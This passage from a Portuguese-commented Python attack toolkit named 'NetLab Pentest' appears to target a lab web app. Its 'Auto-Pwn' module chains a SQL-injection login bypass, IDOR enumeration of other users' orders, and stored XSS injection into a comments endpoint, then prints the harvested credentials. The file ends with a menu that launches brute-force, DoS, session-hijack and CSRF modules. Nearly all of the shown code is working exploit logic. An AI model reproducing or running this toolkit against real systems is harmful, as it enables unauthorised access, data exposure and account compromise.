                tds = [re.sub(r"<[^>]+>", "", td).strip() for td in tds]
                for td in tds:
                    if td and td not in ("1", "2", "3", "—", ""):
                        return td
        except Exception:
            pass
        return None

    def _fase2_login_legitimo(self) -> None:
        usuario, senha = self._credenciais  # type: ignore
        print(f"\n  {_AMAR}[*] Fase 2: Login legítimo como {usuario}{_RESET}")
        try:
            r = _req.post(
                self._url_base + "/login",
                data={"usuario": usuario, "senha": senha},
                timeout=5, allow_redirects=False, headers=_headers_extras(),
            )
            if _login_bem_sucedido(r.status_code, r.text,
                                    r.headers.get("Location", "")):
                ok(f"Sessão estabelecida como {usuario}.")
                self._cookie = r.headers.get("Set-Cookie", "")
                self._log.append(f"Login legítimo: {usuario}")
            else:
                aviso(f"Login falhou (HTTP {r.status_code}). "
                      "O bypass pode ter criado uma sessão temporária.")
        except Exception as e:
            erro(f"Erro no login legítimo: {e}")

    def _fase3_idor(self) -> None:
        print(f"\n  {_AMAR}[*] Fase 3: IDOR — varrendo pedidos{_RESET}")
        sess = _req.Session()
        if self._cookie:
            # Injeta cookie de sessão se tiver
            nome, valor = self._cookie.split("=", 1) if "=" in self._cookie else ("", "")
            if nome:
                sess.cookies.set(nome.strip(), valor.split(";")[0].strip())

        encontrados = 0
        for pid in range(1, 11):
            try:
                r = sess.get(f"{self._url_base}/pedidos?id={pid}",
                             timeout=4, headers={"User-Agent": _ua()})
                if r.status_code == 200 and "Pedido #" in r.text:
                    tds = re.findall(r"<td[^>]*>(.*?)</td>", r.text,
                                     re.DOTALL | re.IGNORECASE)
                    tds = [re.sub(r"<[^>]+>", "", td).strip() for td in tds]
                    dono = next((td for td in tds
                                 if re.match(r"^[a-z]{2,20}$", td, re.IGNORECASE)
                                 and td.lower() not in ("action", "id")), "?")
                    ok(f"Pedido #{pid} exposto — dono: {dono}")
                    encontrados += 1
                time.sleep(0.15)
            except Exception:
                pass
        self._log.append(f"IDOR: {encontrados} pedidos expostos")

    def _fase4_xss(self) -> None:
        print(f"\n  {_AMAR}[*] Fase 4: XSS armazenado em /comentarios{_RESET}")
        if not self._credenciais:
            return

        usuario, senha = self._credenciais  # type: ignore
        sess = _req.Session()
        try:
            # Login para garantir sessão
            r_l = sess.post(
                self._url_base + "/login",
                data={"usuario": usuario, "senha": senha},
                timeout=5, allow_redirects=False, headers=_headers_extras(),
            )
            if not _login_bem_sucedido(r_l.status_code, r_l.text,
                                        r_l.headers.get("Location", "")):
                # Tenta com bypass
                for payload in _SQLI_BYPASS[:2]:
                    r_l = sess.post(
                        self._url_base + "/login",
                        data={"usuario": "admin", "senha": payload},
                        timeout=5, allow_redirects=False, headers=_headers_extras(),
                    )
                    if _login_bem_sucedido(r_l.status_code, r_l.text,
                                           r_l.headers.get("Location", "")):
                        break
                else:
                    erro("Não foi possível autenticar para XSS armazenado.")
                    return

            xss_payload = "<script>alert('AutoPwn XSS — NetLab')</script>"
            r = sess.post(
                self._url_base + "/comentarios",
                data={"conteudo": xss_payload},
                timeout=4, allow_redirects=False, headers=_headers_extras(),
            )
            if r.status_code in (200, 302):
                ok("XSS armazenado injetado em /comentarios!")
                info(f"  Payload: {xss_payload}")
                self._log.append("XSS armazenado: OK")
            else:
                aviso(f"XSS armazenado: HTTP {r.status_code}")
        except Exception as e:
            erro(f"Erro na fase XSS: {e}")

    def mostrar_resultado(self) -> None:
        print(f"\n  {_VERDE}{_BOLD}{'='*56}{_RESET}")
        print(f"  {_VERDE}{_BOLD}  AUTO-PWN CONCLUÍDO{_RESET}")
        print(f"  {_VERDE}{_BOLD}{'='*56}{_RESET}")
        for linha in self._log:
            ok(linha)
        if self._credenciais:
            usuario, senha = self._credenciais
            print(f"\n  {_BOLD}Credenciais obtidas:{_RESET} {usuario} : {senha}")
        print()


# ══════════════════════════════════════════════════════════════════════════════
# Mapa de módulos
# ══════════════════════════════════════════════════════════════════════════════

_MODULOS: Dict[str, Tuple[str, type]] = {
    "1":  ("Força Bruta Assíncrona",    ModuloBruteForce),
    "2":  ("Teste de Estresse / DoS",   ModuloEstresse),
    "3":  ("Scanner de Endpoints",      ModuloScanner),
    "4":  ("Interceptação HTTP",        ModuloIntercepcaoHTTP),
    "5":  ("SQL Injection Exploit",     ModuloSQLInjection),
    "6":  ("XSS Exploit",               ModuloXSS),
    "7":  ("IDOR Exploit",              ModuloIDOR),
    "8":  ("Session Hijack",            ModuloSessionHijack),
    "9":  ("CSRF PoC",                  ModuloCSRF),
    "10": ("Auto-Pwn (Encadeamento)",   ModuloAutoPwn),
}


# ══════════════════════════════════════════════════════════════════════════════
# Verificação de dependências
# ══════════════════════════════════════════════════════════════════════════════

def _checar_deps() -> None:
    ausentes = []
    if not _AIOHTTP_OK:
        ausentes.append("aiohttp")
    if not _REQUESTS_OK:
        ausentes.append("requests")
    if not _RICH_OK:
        ausentes.append("rich")
    if ausentes:
        aviso("Dependências ausentes (funcionalidade reduzida):")
        print(f"    pip install {' '.join(ausentes)}")
        print()


# ══════════════════════════════════════════════════════════════════════════════
# Menu principal
# ══════════════════════════════════════════════════════════════════════════════

def menu_principal() -> None:
    limpar_tela()
    banner()
    _checar_deps()

    if _RICH_OK and console:
        console.print("[bold cyan]  Selecione o módulo:[/bold cyan]")
        for chave, (nome, _) in _MODULOS.items():
            console.print(f"    [bold]{chave:>2}[/bold] — {nome}")
        console.print("     [bold]0[/bold] — Sair\n")
    else:
        print(f"  {_CIANO}Selecione o módulo:{_RESET}")
        for chave, (nome, _) in _MODULOS.items():
            print(f"    {chave:>2} — {nome}")
        print(f"     0 — Sair\n")

    opcao = input(f"  {_CIANO}Módulo:{_RESET} ").strip()

    if opcao == "0":
        info("Encerrando NetLab Pentest.")
        sys.exit(0)

    if opcao not in _MODULOS:
        erro(f"Opção inválida: {opcao!r}")
        time.sleep(1)
        menu_principal()
        return

    nome_mod, ClasseMod = _MODULOS[opcao]
    print(f"\n  {_BOLD}▶  {nome_mod}{_RESET}")

    try:
        mod = ClasseMod()
        mod.executar_interativo()
    except KeyboardInterrupt:
        aviso("\n  Interrompido.")

    input(f"\n  {_CIANO}Pressione Enter para voltar ao menu...{_RESET}")
    menu_principal()


# ══════════════════════════════════════════════════════════════════════════════
# Ponto de entrada
# ══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    try:
        menu_principal()
    except KeyboardInterrupt:
        aviso("\n  Encerrando.")
        sys.exit(0)